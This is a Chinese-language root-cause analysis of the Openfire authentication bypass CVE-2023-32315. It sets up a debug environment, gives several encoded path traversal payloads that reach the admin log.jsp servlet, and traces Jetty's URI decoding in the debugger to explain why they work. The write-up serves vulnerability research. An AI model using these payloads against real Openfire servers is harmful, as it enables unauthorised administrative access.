
参考：
- https://github.com/vulhub/vulhub/blob/master/openfire/CVE-2023-32315/README.zh-cn.md

### 环境搭建

```bash
wget https://github.com/igniterealtime/Openfire/releases/download/v4.7.3/openfire_4_7_3.tar.gz
tar zxf openfire_4_7_3.tar.gz
cd bin
chmod +x ./openfire.sh
./openfire.sh start -debug
```
即可监听在5005端口进行调试。

payload:
```
/setup/setup-/../../log.jsp
```

![image](https://github.com/shadowsock5/Poc/assets/30398606/2e63de08-0853-49cb-b267-e050b57f7ce6)
说明到这里的时候，不能有`%2e`。
将`../../`进行unicode编码，得到：
```
/setup/setup-/\u002E\u002E/\u002E\u002E/log.jsp
```

![image](https://github.com/shadowsock5/Poc/assets/30398606/d3db00ec-f5c3-41d4-8648-ca43b14a4d83)

虽然能过认证，但是响应是这样的：
![image](https://github.com/shadowsock5/Poc/assets/30398606/ddd0cd28-6882-455e-bc6f-b5da33a34023)

直接抄答案，
```
/setup/setup-/%u002E%u002E/%u002E%u002E/log.jsp
```
绕过了。
![image](https://github.com/shadowsock5/Poc/assets/30398606/e7615e3e-f554-4c39-a058-46cc2c97ed4a)

调试看一下为什么？

注意这里的log.jsp并不是真的存在这个文件，而是在web.xml中有其映射的servlet。
```xml
    <servlet>
        <servlet-name>org.jivesoftware.openfire.admin.log_jsp</servlet-name>
        <servlet-class>org.jivesoftware.openfire.admin.log_jsp</servlet-class>
    </servlet>
...
    <servlet-mapping>
        <servlet-name>org.jivesoftware.openfire.admin.log_jsp</servlet-name>
        <url-pattern>/log.jsp</url-pattern>
    </servlet-mapping>
```

在这里下断点：
org.jivesoftware.openfire.admin.log_jsp#_jspService

![image](https://github.com/shadowsock5/Poc/assets/30398606/e7811e9d-0332-4242-94c9-ca1cb518afad)
断下来之后往前回溯。
![image](https://github.com/shadowsock5/Poc/assets/30398606/7ae5ced4-59e4-40f0-a618-46db5ac750fe)

openfire\lib\jetty-servlet-9.4.43.v20210629.jar!\org\eclipse\jetty\servlet\ServletHolder.class# handle


在这里
openfire\lib\jetty-http-9.4.43.v20210629.jar!\org\eclipse\jetty\http\HttpURI.class
看到了：
```java

    static {
        __ambiguousSegments.put(".", Boolean.FALSE);
        __ambiguousSegments.put("%2e", Boolean.TRUE);
        __ambiguousSegments.put("%u002e", Boolean.TRUE);
        __ambiguousSegments.put("..", Boolean.FALSE);
        __ambiguousSegments.put(".%2e", Boolean.TRUE);
        __ambiguousSegments.put(".%u002e", Boolean.TRUE);
        __ambiguousSegments.put("%2e.", Boolean.TRUE);
        __ambiguousSegments.put("%2e%2e", Boolean.TRUE);
        __ambiguousSegments.put("%2e%u002e", Boolean.TRUE);
        __ambiguousSegments.put("%u002e.", Boolean.TRUE);
        __ambiguousSegments.put("%u002e%2e", Boolean.TRUE);
        __ambiguousSegments.put("%u002e%u002e", Boolean.TRUE);
    }
```
所以从这里面看，只有不包含`%2e`的，能变成..的应该都可以，比如：
```
/setup/setup-/.%u002e/.%u002e/log.jsp
/setup/setup-/%u002e./%u002e./log.jsp
```

一些细节：
![image](https://github.com/shadowsock5/Poc/assets/30398606/f63dfd7a-6e23-4011-b2eb-3d1e56c534ef)

openfire\lib\jetty-util-9.4.43.v20210629.jar!\org\eclipse\jetty\util\URIUtil.class
![image](https://github.com/shadowsock5/Poc/assets/30398606/e291fb82-1dc0-473e-b059-466d4147709e)

openfire\lib\jetty-http-9.4.43.v20210629.jar!\org\eclipse\jetty\http\HttpURI.class
![image](https://github.com/shadowsock5/Poc/assets/30398606/d83c058a-3a45-4a6d-a2f1-7524af4508ca)
这里的
```java
String decodedNonCanonical = URIUtil.decodePath(this._path)
```
把
```
/setup/setup-/.%u002e/.%u002e/log.jsp
=>
/setup/setup-/../../log.jsp
```
然后
```java
this._decodedPath = URIUtil.canonicalPath(decodedNonCanonical)
```
把
```
/setup/setup-/../../log.jsp
=>
/log.jsp
```

这样在这里，
openfire\lib\jetty-server-9.4.43.v20210629.jar!\org\eclipse\jetty\server\HttpChannelOverHttp.class

![image](https://github.com/shadowsock5/Poc/assets/30398606/64f6a262-7743-4320-b199-fdfb98a811ec)

已经被转换成了`/log.jsp`。

再来看看为什么这个url对应到了log_jsp这个servlet：
![image](https://github.com/shadowsock5/Poc/assets/30398606/3880365a-e15f-4293-b004-5da88e8ca317)

这里直接就得到的是`NotAsync:org.jivesoftware.openfire.admin.log_jsp@6a5ef204`，调试一下怎么得到的。但是如果不是启动后第一次访问这个servlet，就没法得到`this._servlet`被赋值的过程。
重新启动，第一次访问即使用这个payload。
在openfire\lib\jetty-servlet-9.4.43.v20210629.jar!\org\eclipse\jetty\servlet\ServletHolder.class#initServlet的第一行下断点。
没找到。
最后在这里找到了
openfire\lib\jetty-servlet-9.4.43.v20210629.jar!\org\eclipse\jetty\servlet\ServletHandler.class#doScope
![image](https://github.com/shadowsock5/Poc/assets/30398606/26f9f1dd-50ac-49a6-b4c8-a408be079666)
在这一行就得到了/log.jsp对应的servlet：
```java
String old_path_info = baseRequest.getPathInfo()
```
看一下这个`pathInfo`是在哪里被set的：
有两处：

![image](https://github.com/shadowsock5/Poc/assets/30398606/8e6bd355-5e89-426d-a109-aaf1efefc411)
```java
setPathInfo:2210, Request (org.eclipse.jetty.server)
doScope:1340, ContextHandler (org.eclipse.jetty.server.handler)
handle:141, ScopedHandler (org.eclipse.jetty.server.handler)
handle:191, ContextHandlerCollection (org.eclipse.jetty.server.handler)
handle:146, HandlerCollection (org.eclipse.jetty.server.handler)
handle:127, HandlerWrapper (org.eclipse.jetty.server.handler)
handle:516, Server (org.eclipse.jetty.server)
lambda$handle$1:388, HttpChannel (org.eclipse.jetty.server)
dispatch:-1, 222164335 (org.eclipse.jetty.server.HttpChannel$$Lambda$142)
dispatch:633, HttpChannel (org.eclipse.jetty.server)
handle:380, HttpChannel (org.eclipse.jetty.server)
onFillable:277, HttpConnection (org.eclipse.jetty.server)
succeeded:311, AbstractConnection$ReadCallback (org.eclipse.jetty.io)
fillable:105, FillInterest (org.eclipse.jetty.io)
run:104, ChannelEndPoint$1 (org.eclipse.jetty.io)
runJob:883, QueuedThreadPool (org.eclipse.jetty.util.thread)
run:1034, QueuedThreadPool$Runner (org.eclipse.jetty.util.thread)
run:748, Thread (java.lang)
```

往前回溯。
发现在openfire\lib\jetty-server-9.4.43.v20210629.jar!\org\eclipse\jetty\server\Request.class#setMetaData
中会调用HttpURI uri.getDecodedPath()，即获取这个uri的`_decodedPath`属性。而这个uri之前已经被
```java
this._decodedPath = URIUtil.canonicalPath(decodedNonCanonical)
```
转换为`/log.jsp`了。
![image](https://github.com/shadowsock5/Poc/assets/30398606/9bd5534d-c1f7-4369-a870-f98f0fe307c0)
最后将这个path：`/log.jsp`设置到org.eclipse.jetty.server.Request的pathInfo上了。
![image](https://github.com/shadowsock5/Poc/assets/30398606/8ffe9b14-b50f-4219-ab0a-a4816ceda851)


## Ref
- https://mp.weixin.qq.com/s/cuULlP0F0Xf9Rhmkb-9H0g
- https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w
- https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
